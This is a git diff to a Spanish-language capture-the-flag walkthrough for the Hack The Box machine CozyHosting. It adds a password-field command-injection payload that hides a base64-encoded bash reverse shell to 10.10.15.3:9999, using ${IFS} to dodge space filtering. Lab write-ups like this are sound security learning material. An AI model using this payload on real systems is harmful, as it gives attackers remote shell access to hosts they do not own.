@@ -100,11 +100,15 @@ dirsearch -u http://cozyhosting.htb/
 - Hacemos pruebas. Podemos repetir el paso anterior pero con el Burpsuite activo y ver como funciona. 
 
 ## inyección de shell
--Si revisamos la pagina, nos daremos cuenta que hay un apartado de SSH. Lo cual nos puede servir para entrar directamente a su servicio por medio de inyección de shell y Burbsuite
+-Si revisamos la pagina, nos daremos cuenta que hay un apartado de SSH. Lo cual nos puede servir para entrar directamente a su servicio por medio de inyección de shell y Burpsuite
 - **`¿Que es la inyección de shell?**:La inyección de comandos se refiere a una vulnerabilidad en la que un atacante puede insertar comandos maliciosos o instrucciones en una entrada de datos que luego se ejecutan en el sistema objetivo a través de una conexión SSH u otro protocolo.
 ![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/da3f192a-28e4-4ff4-9754-1c15cdcf9e9a)
 
-
+- Procedemos a escribir 
+- Usario:  ```localhost  ```
+-   Contraseña:  ```kanderson;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4zLzk5OTkgMD4mMQ=="|base64${IFS}-d|bash;  ```
+-   Ya ingresado, revisamos el Burpsuite
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/afc53d27-78bb-44ab-969f-e6c2fa362e4d)
 
 
 
